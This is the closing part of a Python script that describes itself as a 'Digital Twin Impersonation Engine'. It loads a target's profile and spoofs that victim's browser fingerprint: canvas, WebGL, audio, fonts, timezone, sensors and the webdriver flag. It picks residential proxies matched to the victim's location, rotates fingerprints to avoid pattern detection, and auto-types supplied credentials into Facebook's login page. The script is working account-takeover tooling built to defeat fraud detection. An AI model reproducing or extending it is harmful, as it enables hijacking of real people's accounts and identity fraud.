        print("  ✓ Screen resolution matched")
        print("  ✓ Device pixel ratio set")
        print("  ✓ Platform information spoofed")
        print("  ✓ Hardware concurrency matched")
        print("  ✓ Device memory matched")
        print("  ✓ Timezone spoofed")
        print("  ✓ WebGL fingerprint spoofed")
        print("  ✓ Canvas fingerprint spoofed")
        print("  ✓ Audio fingerprint spoofed")
        print("  ✓ Font fingerprint spoofed")
        print("  ✓ Battery API spoofed")
        print("  ✓ Connection API spoofed")
        print("  ✓ Device orientation spoofed")
        print("  ✓ Touch support configured")
        print("  ✓ Biometric sensors configured")
        print("  ✓ WebRTC blocked")
        print("  ✓ Navigator.webdriver hidden")
        print("="*60)
        print("\n[ACTION] Opening Facebook login page for manual login...")
        print("[INFO] You can now login manually. Browser will remain open.")
        print("[INFO] Press Ctrl+C to exit when done.\n")
        
        driver.get("https://mbasic.facebook.com/login.php")
        
        if getattr(args, "username", None) and getattr(args, "password", None):
            print("[INFO] Auto-typing login credentials on Facebook mobile page...")
            auto_type_login_credentials(driver, args.username, args.password)
            
            # Wait a bit after typing before clicking
            time.sleep(random.uniform(SUBMIT_DELAY_MIN, SUBMIT_DELAY_MAX))
            
            # Auto-click login button
            print("[INFO] Auto-clicking login button...")
            auto_enable_and_click_login_button(driver)
        else:
            print("[INFO] Auto-typing skipped - username/password not provided.")
        
        # Keep browser open - user will login manually
        print("[INFO] Browser is ready. Please login manually.")
        print("[INFO] All fingerprint spoofing is active and configured.")
        print("[INFO] Waiting for manual login... (Press Ctrl+C to exit)\n")
        
        # Keep script running until user exits
        try:
            while True:
                time.sleep(60)  # Check every minute
                current_url = driver.current_url
                if 'facebook.com' in current_url and 'login' not in current_url.lower():
                    print(f"[INFO] Detected navigation away from login page: {current_url}")
                    print("[INFO] Login may have been successful. Browser remains open.")
        except KeyboardInterrupt:
            print("\n[INFO] Exiting... Browser will remain open.")
            print("[INFO] You can manually close the browser when done.")

    except Exception as e:
        print(f"\n--- [FAILURE] OPERATION FAILED: {e} ---")
        update_session_status(profile_data, "FAIL", f"Operation failed: {str(e)}")
        if driver:
            print("[INFO] Browser will remain open for debugging.")
    # Browser will remain open - manual close required
    # finally:
    #     if driver:
    #         driver.quit()
    #         print("[INFO] WebDriver closed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Digital Twin Impersonation Engine - Manual Login Mode (Fingerprint Setup Only).")
    parser.add_argument("--profile", required=True, help="Path to the target's JSON profile file.")
    parser.add_argument("--proxy", help="Proxy string (e.g., socks5://user:pass@host:port).")
    # NEW: DataImpulse auto-generation
    parser.add_argument("--dataimpulse-creds", help="DataImpulse credentials in format 'username:password'. Proxy will be auto-generated from victim's location.")
    parser.add_argument("--proxy-protocol", choices=["socks5", "http", "https"], default="socks5", help="Proxy protocol for DataImpulse proxy generation (default: socks5). Use http/https for Camoufox compatibility.")
    parser.add_argument("--proxy-type", choices=["rotating", "sticky"], default="rotating", help="Proxy type for DataImpulse: rotating (port 823) or sticky (port 10000) (default: rotating).")
    parser.add_argument("--test-mode", action="store_true", help="Enable test mode to bypass IP validation for testing.")
    parser.add_argument("--camoufox", action="store_true", help="Use Camoufox (Firefox/Playwright) instead of Chrome/Selenium. Requires camoufox package.")
    parser.add_argument("--camoufox-strict", action="store_true", help="Use Camoufox with strict fingerprint validation (no defaults, all required fields must be present). Implies --camoufox.")
    parser.add_argument("--username", help="Username, phone, or email to auto-type on the login page.")
    parser.add_argument("--password", help="Password to auto-type on the login page.")
    # NEW: Rotation and behavioral arguments
    parser.add_argument("--enable-rotation", action="store_true", help="Enable fingerprint/template rotation to prevent pattern detection.")
    parser.add_argument("--behavioral-phase", type=int, choices=[0, 1, 2], default=1, help="Behavioral layer phase: 0=disabled, 1=basic (typing/touch), 2=advanced (sensors/navigation). Default: 1.")
    parser.add_argument("--template-mode", action="store_true", help="Use template library instead of victim fingerprint.")
    parser.add_argument("--validate-only", action="store_true", help="Run validation only, don't create driver or open browser.")
    args = parser.parse_args()
    
    for d in ['sessions', 'failures']:
        if not os.path.exists(d):
            os.makedirs(d)
            
    main(args)